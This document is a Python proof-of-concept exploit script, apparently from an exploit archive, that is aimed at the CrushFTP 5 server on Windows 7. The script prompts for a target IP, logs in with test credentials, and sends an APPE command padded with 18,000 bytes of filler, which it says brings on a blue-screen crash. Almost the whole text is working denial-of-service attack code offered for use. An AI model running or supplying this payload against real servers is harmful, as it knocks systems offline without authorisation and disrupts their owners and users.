#
#Exploit Title:
#Crush FTP 5 'APPE' command Remote BSOD Poc Exploit
#
#Date: 06/09/2011
#
#Author: BSOD Digital (Fabien DROMAS)
#Mail: bsoddigital@gmail.com
#
#
#Test:
#OS: Windows 7
#Versions: 5.7.0_96
#
#
#Link:
#https://www.crushftp.com/early5/CrushFTP5_PC.zip
#
#!/usr/bin/env python

import socket

host = raw_input("Type Target IP: ")

data1 = ("A" * 9000)
data2 = (" " * 9000)
cmd = ('APPE')

print ("\n--------------------------------------------------\n")
print ("Crush FTP 5 'APPE' command Remote BSOD Poc Exploit\n")
print ("      BSOD Digital - bsoddigital@gmail.com        \n")
print ("--------------------------------------------------\n")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, 21))
r=s.recv(1024)
print (r)
s.send("USER test\r\n")
r=s.recv(1024)
print (r)
s.send("PASS test\r\n")
r=s.recv(1024)
print (r)
s.send(cmd + " " + data1 + data2 + '\r\n')
print ("Payload Send!\n")
print ("2 or 3 seconds before the blue screen of the death...")
s.close()

 
        